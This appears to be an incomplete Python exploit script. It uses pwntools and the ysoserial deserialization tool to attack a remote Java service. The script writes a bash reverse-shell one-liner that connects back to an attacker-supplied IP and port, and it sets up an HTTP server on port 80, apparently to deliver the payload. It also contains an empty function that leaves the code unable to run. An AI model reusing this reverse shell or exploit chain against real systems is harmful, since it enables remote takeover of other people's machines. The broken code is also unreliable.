#!/usr/bin/python3

import os
from pwn import *
import argparse
from tqdm import tqdm
import urllib.request
import os.path
from progress.bar import Bar
import requests
from http.server import HTTPServer, CGIHTTPRequestHandler


#Global Variables

dowloadSource="https://github.com/frohoff/ysoserial"
dowloadJar="https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar"


# Arguments
parser = argparse.ArgumentParser()
requiredNamed = parser.add_argument_group('Required named arguments')
requiredNamed.add_argument("-i","--ip", help="Option to put the remote ip", required=True)
requiredNamed.add_argument("-p","--port", help="Option to put the remote port", required=True)
requiredNamed.add_argument("-li", help="Option to put the local ip", required=True)
requiredNamed.add_argument("-lp", help="Option to put the local port", required=True)
parser.parse_args()
args=parser.parse_args()



def createShell():
	bash="/bin/bash -i >& /dev/tcp/%s/%s 0>&1" % (args.li,args.lp)
	script = open('bash.sh', 'w')
	script.write(bash)
	script.close()
	
def createServerPython():
	os.chdir('.')	
	server_object = HTTPServer(server_address=('', 80), RequestHandlerClass=CGIHTTPRequestHandler) # Create server object listening the port 80
	server_object.serve_forever()

def c():


if __name__=="__main__":
	p1=log.progress("Create bash file...")
	createShell()
	p1.status("Created")


	#p2=log.progress("Running server in python")
	#createServerPython()
